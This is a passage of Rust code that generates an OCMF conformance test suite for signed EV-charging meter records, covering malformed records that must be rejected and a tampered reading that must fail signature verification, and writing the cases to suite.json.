            "curve",
            &format!(
                "a record signed {} [OCMF Tab. 22]",
                get("algorithm").unwrap()
            ),
            get("record").context("record")?,
            get("key_spki_hex"),
        )?);
    }

    // ── Records that must not be accepted ──────────────────────────────────
    for (id, description, record) in [
        ("not-ocmf", "no OCMF header", "NOPE|{}|{}".to_string()),
        (
            "missing-delimiter",
            "a header with no delimiter after it",
            "OCMF".to_string(),
        ),
        (
            "missing-signature-section",
            "a payload with no signature section",
            format!("OCMF|{}", payload_with("", &reading_json(""))),
        ),
        (
            "payload-not-an-object",
            "a payload section that is a JSON array",
            r#"OCMF|[]|{"SD":"00"}"#.to_string(),
        ),
        (
            "trailing-section-bytes",
            "bytes between the end of the payload and the delimiter",
            format!(
                "OCMF|{} junk|{{\"SD\":\"00\"}}",
                payload_with("", &reading_json(""))
            ),
        ),
        (
            "too-many-sections",
            "five pipe-separated sections",
            format!("{clean}|{k}|extra"),
        ),
    ] {
        out.push(raw(
            &format!("reject/{id}"),
            "reject",
            description,
            record,
            None,
        )?);
    }

    // A well-formed record whose signature does not match: the one outcome
    // that means "not authentic".
    out.push(raw(
        "reject/tampered-reading",
        "reject",
        "a valid record with one digit of RV changed — parses, must not verify",
        clean.replace(r#""RV":100.000"#, r#""RV":900.000"#),
        Some(k.clone()),
    )?);

    Ok(out)
}

/// Writes `conformance/suite.json`.
pub fn generate(root: &std::path::Path) -> Result<()> {
    let cases = cases()?;

    // Nothing goes in that this crate cannot read back, and no case claims to
    // verify unless it actually does.
    for c in &cases {
        if c.parses {
            let r = Record::parse(&c.record)
                .with_context(|| format!("{}: generated an unreadable record", c.id))?;
            if r.to_string() != c.record {
                bail!("{}: generated a record that does not round-trip", c.id);
            }
        }
        if c.verifies == Some(true) {
            let r = Record::parse(&c.record)?;
            let key = PublicKey::from_text(
                c.key.as_ref().context("a verifying case needs a key")?,
                r.signature().curve(),
            )?;
            ocmf::verify(&r, &key)
                .map_err(|e| anyhow::anyhow!("{}: claims to verify and does not: {e}", c.id))?;
        }
    }

    let mut json = String::with_capacity(cases.len() * 700);
    json.push_str("{\n \"version\": 1,\n");
    json.push_str(" \"description\": \"OCMF conformance suite. See conformance/README.md.\",\n");
    json.push_str(" \"cases\": [\n");
    for (i, c) in cases.iter().enumerate() {
        let esc = |s: &str| {
            let mut o = String::with_capacity(s.len() + 8);
            for ch in s.chars() {
                match ch {
                    '"' => o.push_str("\\\""),
                    '\\' => o.push_str("\\\\"),
                    '\n' => o.push_str("\\n"),
                    '\r' => o.push_str("\\r"),
                    '\t' => o.push_str("\\t"),
                    c if (c as u32) < 0x20 => {
                        let _ = write!(o, "\\u{:04x}", c as u32);
                    }
                    c => o.push(c),
                }
            }
            o
        };
        let devs = c
            .deviations
            .iter()
            .map(|d| format!("\"{d}\""))
            .collect::<Vec<_>>()
            .join(", ");
        let _ = write!(
            json,
            "  {{\n   \"id\": \"{}\",\n   \"group\": \"{}\",\n   \"description\": \"{}\",\n   \"record\": \"{}\",\n",
            c.id,
            c.group,
            esc(&c.description),
            esc(&c.record)
        );
        if let Some(key) = &c.key {
            let _ = writeln!(json, "   \"key\": \"{key}\",");
        }
        let _ = write!(
            json,
            "   \"expect\": {{ \"parses\": {}, \"round_trips\": {}, \"verifies\": {}, \"deviations\": [{devs}], \"readings\": {}, \"billable_readings\": {} }}\n  }}{}\n",
            c.parses,
            c.round_trips,
            c.verifies.map_or("null".to_string(), |v| v.to_string()),
            c.readings.map_or("null".to_string(), |v| v.to_string()),
            c.billable.map_or("null".to_string(), |v| v.to_string()),
            if i + 1 == cases.len() { "" } else { "," }
        );
    }
    json.push_str(" ]\n}\n");

    let dir = root.join("conformance");
    std::fs::create_dir_all(&dir)?;
    let path = dir.join("suite.json");
    std::fs::write(&path, json)?;

    let groups = ["table", "deviation", "curve", "reject"];
    println!(
        "conformance: {} cases written to {}",
        cases.len(),
        path.display()
    );
    for g in groups {
        println!(
            "  {g:<10} {}",
            cases.iter().filter(|c| c.group == g).count()
        );
    }
    Ok(())
}
